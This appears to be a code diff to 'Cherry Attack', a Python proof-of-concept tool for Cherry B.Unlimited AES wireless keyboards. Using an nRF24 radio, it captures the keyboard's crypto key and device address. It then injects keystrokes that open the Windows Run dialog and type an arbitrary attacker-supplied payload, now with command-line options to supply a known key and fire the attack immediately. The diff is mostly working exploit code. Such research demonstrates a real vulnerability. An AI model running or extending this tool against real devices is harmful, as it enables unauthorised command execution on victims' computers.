@@ -41,10 +41,11 @@
 __version__ = '1.1'
 __author__ = 'Einstein2150'
 
+import argparse
 import logging
 import pygame
 
-from binascii import hexlify
+from binascii import hexlify, unhexlify
 from lib import keyboard
 from lib import nrf24
 from logging import debug, info
@@ -53,7 +54,7 @@ from time import sleep, time
 from sys import exit
 
 # constants
-ATTACK_VECTOR   = "Just an input from the hacker :D Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet."
+DEFAULT_ATTACK_VECTOR   = "Just an input from the hacker :D"
 
 RECORD_BUTTON   = pygame.K_1
 REPLAY_BUTTON   = pygame.K_2
@@ -74,9 +75,12 @@ KEYSTROKE_DELAY = 0.01
 class CherryAttack():
     """Cherry Attack"""
 
-    def __init__(self):
+    def __init__(self, crypto_key=None, device_address=None, attack_vector=None, execute=False):
         """Initialize Cherry Attack"""
-
+        info(f"Execute: {execute}, Attack Vector: {attack_vector}")
+        self.crypto_key = crypto_key
+        self.device_address = device_address
+        self.attack_vector = attack_vector
         self.state = IDLE
         self.channel = 6
         self.payloads = []
@@ -84,6 +88,7 @@ class CherryAttack():
         self.screen = None
         self.font = None
         self.statusText = ""
+        self.execute = execute
 
         try:
             pygame.init()
@@ -95,14 +100,53 @@ class CherryAttack():
             self.font = pygame.font.SysFont("arial", 24)
             self.screen.blit(self.bg, (0, 0))
             pygame.display.update()
-            pygame.key.set_repeat(250, 50)
+            #pygame.key.set_repeat(250, 50)
 
             self.radio = nrf24.nrf24()
             self.radio.enable_lna()
-            self.setState(SCAN)
+            
+            # If key and device address are provided, skip scanning and initialize keyboard directly
+            if self.crypto_key and self.device_address:
+                self.initialize_keyboard()
+            else:
+                self.setState(SCAN)
+            # Check if execute flag is set and attack vector is provided
+            if execute and attack_vector:
+                self.setState(ATTACK)
+                self.perform_attack()  # Perform the attack immediately
+                
         except Exception as e:
             info(f"[-] Error: Could not initialize Cherry Attack: {e}")
+            
+    def perform_attack(self):
+        """Perform the attack with the provided attack vector."""
+        if self.kbd is not None:
+            # send keystrokes for attack
+            keystrokes = []
+            keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))
+            keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_GUI_RIGHT, keyboard.KEY_R))
+            keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))
 
+            # send attack keystrokes
+            sleep(0.1)
+
+            keystrokes = self.kbd.getKeystrokes(self.attack_vector)
+            keystrokes += self.kbd.getKeystroke(keyboard.KEY_RETURN)
+
+            # send attack keystrokes with a small delay
+            for k in keystrokes:
+                self.radio.transmit_payload(k)
+                info("Sent payload: {0}".format(hexlify(k)))
+
+        self.setState(IDLE)
+
+    def initialize_keyboard(self):
+        """Initialize the keyboard with provided crypto key and device address"""
+        self.kbd = keyboard.CherryKeyboard(bytes(self.crypto_key))
+        info(f"Initialized keyboard with Crypto Key: {hexlify(self.crypto_key).decode('utf-8')} and Device Address: {':'.join(f'{b:02X}' for b in self.device_address)}")
+        info('-------------------------')
+        self.setState(IDLE)     
+            
     def showText(self, text, x=40, y=140):
         output = self.font.render(text, True, (0, 0, 0))
         self.screen.blit(output, (x, y))
@@ -123,6 +167,24 @@ class CherryAttack():
         else:
             self.state = IDLE
             self.statusText = "IDLING"
+            
+       # Call the method to display the menu after switching to IDLE
+        if self.state == IDLE:
+            self.display_menu()
+
+    def display_menu(self):
+        self.showText("-------------------------")
+        info('-------------------------')
+        info('1: RECORDING')
+        info('2: REPLAYING')
+        info('3: ATTACKING')
+        info('4: SCANNING')
+        info('-------------------------')
+        self.showText("1: RECORDING")
+        self.showText("2: REPLAYING")
+        self.showText("3: ATTACKING")
+        self.showText("4: SCANNING")
+        #pygame.display.update()
 
     def unique_everseen(self, seq):
         seen = set()
@@ -210,32 +272,87 @@ class CherryAttack():
                         info('Received payload: {0}'.format(hexlify(payload).decode('utf-8')))
                     if packet_count >= 4 and time() - last_key > SCAN_TIME:
                         break
+                        
                 self.radio.receive_payload()
-                self.showText("Got crypto key!")
-                info('Got crypto key!')
+                # self.showText("Got crypto key!")
+                self.showText("-------------------------")
+                # Log the Crypto Key and Device Address in hex format
+                crypto_key_hex = hexlify(payload).decode('utf-8')
+                device_address_hex = ':'.join(f'{b:02X}' for b in self.address)
+                info(f'Got crypto key: {crypto_key_hex}')
+                info(f'Device address: {device_address_hex}')
+                
                 self.kbd = keyboard.CherryKeyboard(bytes(payload))
                 info('Initialize keyboard')
                 self.setState(IDLE)
 
             elif self.state == ATTACK:
-                if self.kbd:
-                    keystrokes = [
-                        self.kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE),
-                        self.kbd.keyCommand(keyboard.MODIFIER_GUI_RIGHT, keyboard.KEY_R),
-                        self.kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE)
-                    ]
-                    for k in keystrokes:
-                        self.radio.transmit_payload(k)
-                        info('Sent payload: {0}'.format(hexlify(k).decode('utf-8')))
-                        sleep(KEYSTROKE_DELAY)
-                self.setState(IDLE)
+                    if self.kbd != None:
+                        # send keystrokes for attack
+                        keystrokes = []
+                        keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))
+                        keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_GUI_RIGHT, keyboard.KEY_R))
+                        keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))
+
+                        # send attack keystrokes
+                        sleep(0.1)
+
+                        keystrokes = []
+                        keystrokes = self.kbd.getKeystrokes(ATTACK_VECTOR)
+                        keystrokes += self.kbd.getKeystroke(keyboard.KEY_RETURN)
+
+                        # send attack keystrokes with a small delay
+                        for k in keystrokes:
+                            self.radio.transmit_payload(k)
+
+                            # info output
+                            info("Sent payload: {0}".format(hexlify(k)))
+                        
+                    self.setState(IDLE)
 
             sleep(0.05)
 
 if __name__ == '__main__':
-    # setup logging
+    # Setup logging
     level = logging.INFO
     logging.basicConfig(level=level, format='[%(asctime)s.%(msecs)03d]  %(message)s', datefmt="%Y-%m-%d %H:%M:%S")
     info("Start Cherry Attack v{0}".format(__version__))
 
-    CherryAttack().run()
+    # Set up argument parser
+    parser = argparse.ArgumentParser(description='Cherry Attack PoC - a proof-of-concept tool for demonstrating replay and keystroke injection vulnerabilities of Cherry B.Unlimited AES wireless keyboards.')
+    parser.add_argument('-key', type=str, help='The crypto key')
+    parser.add_argument('-hex', type=str, help='The device address in hex format (e.g. 00:11:22:33:44)')
+    parser.add_argument('-p', '--payload', type=str, help='Custom payload string (can contain special characters)')
+    parser.add_argument('-x', '--execute', action='store_true', help='Execute attack immediately with the provided payload and quit')
+
+    args = parser.parse_args()
+
+    # Validate that both -key and -hex are provided if any
+    if args.key and args.hex:
+        try:
+            crypto_key = unhexlify(args.key.replace(':', ''))
+            device_address = unhexlify(args.hex.replace(':', ''))
+            if len(crypto_key) != 16 or len(device_address) != 5:
+                raise ValueError("Invalid length of crypto key or device address")
+        except Exception as e:
+            info(f"Error: {e}")
+            exit(1)
+    elif args.key or args.hex:
+        info("Both -key and -hex must be provided together")
+        exit(1)
+    else:
+        crypto_key = None
+        device_address = None
+
+    # Set the payload
+    if args.payload:
+        ATTACK_VECTOR = args.payload
+        info(f"Custom payload set: {ATTACK_VECTOR}")
+
+    # Hier ist die Anpassung
+    if args.execute and args.payload:
+        cherry_attack = CherryAttack(crypto_key, device_address, args.payload, execute=True)
+        #cherry_attack.perform_attack()  # Führe den Angriff sofort aus
+    else:
+        cherry_attack = CherryAttack(crypto_key, device_address)
+        cherry_attack.run()
